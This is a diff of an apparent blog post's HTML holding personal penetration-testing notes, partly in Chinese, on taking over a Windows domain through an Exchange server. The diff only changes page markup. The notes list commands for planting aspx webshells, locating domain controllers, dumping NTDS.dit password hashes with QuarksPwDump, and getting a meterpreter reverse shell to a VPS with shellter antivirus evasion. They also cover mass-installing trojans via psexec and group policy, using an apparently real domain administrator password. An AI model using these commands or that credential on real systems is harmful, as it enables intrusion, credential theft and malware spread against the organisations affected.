@@ -117,7 +117,7 @@
 
         <span itemprop="articleBody"><h3 id="0x01-upload-backup-webshells">0x01 upload backup webshells</h3>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.there exists a webshell upload by someone else:https://xx.oo.xx/owa/auth/error1.aspx
+<div class="highlighter-rouge"><pre class="highlight"><code>1.there exists a webshell upload by someone else:https://xx.oo.xx/owa/auth/error1.aspx
 2.webshell in different folder has different privileges
     https://xx.oo.xx/aspnet_client/system_web/2_0_50727/some.aspx      C:\inetpub\wwwroot\&gt; whoami ---&gt; iis apppool\defaultapppool
     https://xx.oo.xx对应C:\inetpub\wwwroot\      目录下(index.html)   iis权限
@@ -142,10 +142,11 @@
     C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\auth\一句话.aspx is ok to parse
     C:\inetpub\wwwroot\大马.aspx is not ok to parse before my "adding a new web.config" way in upon 3
     C:\inetpub\wwwroot\一句话.aspx is ok to parse,with iis pri
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h3 id="0x02-find-domain-controllers-and-dc-administrator-username--password">0x02 find domain controllers and dc administrator username &amp; password</h3>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://drops.wooyun.org/tips/421 
+<div class="highlighter-rouge"><pre class="highlight"><code>https://drops.wooyun.org/tips/421 
     dsquery server(best)
     nslookup -type=SRV _ldap._tcp.baidu.com(baidu.com is a domain name,others should be like xxx.org.xx)
     netdom query fsmo
@@ -158,10 +159,11 @@ mimikatz
 at 23:0 /every:m,t,w,th,f,s,su "d:\1.bat"
 d:\1.bat:
 "C:\recycler\srclog.exe" -w &gt;&gt; "C:\recycler\test.txt"
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h3 id="0x03-get-all-hashs-in-the-domain-controllers-machine">0x03 get all hashs in the domain controllers machine</h3>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>link a:
+<div class="highlighter-rouge"><pre class="highlight"><code>link a:
     https://drops.wooyun.org/tips/6617
 link b:
     https://blogs.msdn.microsoft.com/adioltean/2005/01/05/script-recipe-of-the-week-how-to-copy-an-opened-file/
@@ -182,10 +184,11 @@ step3:
     QuarksPwDump.exe --dump-hash-domain -with-history -nt c:\windows\ntds\ntds.dit -o c:\windows\myfolder\log.txt
     (or quarkspwdump.exe --dump-hash-domain -hist -nt c:\windows\ntds\ntds.dit -o c:\windows\myfolder\log.txt)
     the origin commands from link a is "QuarksPwDump.exe -dhb -hist -nt ntds.dit -o log.txt",which proved wrong with my quarkspwdump.exe file
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h3 id="0x04-get-a-meterpreter-reverse-shell">0x04 get a meterpreter reverse shell</h3>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.found windows firewall is not open on the target,but "in/out rules exists"
+<div class="highlighter-rouge"><pre class="highlight"><code>1.found windows firewall is not open on the target,but "in/out rules exists"
 2.found reverse port like 200 can not get it successfully
 3.can not find why the meterpreter shell can not reverse connecting msf successfully
 4.do these to get meterpreter reverse shell
@@ -194,10 +197,11 @@ step3:
     local pc:msf--&gt;set lport 300--&gt;set rhost vps's ip
 5.found 53 is ok
 6.better to use shellter to supass avkiller
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h3 id="0x05-批量种马">0x05 批量种马</h3>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt;psexec.exe @pc.txt -u ABIMAQ\Administrator -p k78m90 -c c:\recycler\putty.exe
+<div class="highlighter-rouge"><pre class="highlight"><code>1&gt;psexec.exe @pc.txt -u ABIMAQ\Administrator -p k78m90 -c c:\recycler\putty.exe
 2&gt;msf
     use exploit/windows/smb/psexec
     set EXE::Custom /root/桌面/putty.exe
@@ -210,7 +214,8 @@ step3:
     https://technet.microsoft.com/zh-cn/library/cc731684(v=ws.11).aspx
     https://social.technet.microsoft.com/Forums/ru-RU/d14a3017-8ad8-4f89-a3ea-7b93fcfa3271?forum=windowsserversystemzhchs
 5&gt;msf生成msi后用组策略管理编辑器添加安装msi的动作,详情如下图
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%89%B9%E9%87%8F%E5%AE%89%E8%A3%85msi.jpg" /></p>
 </span>
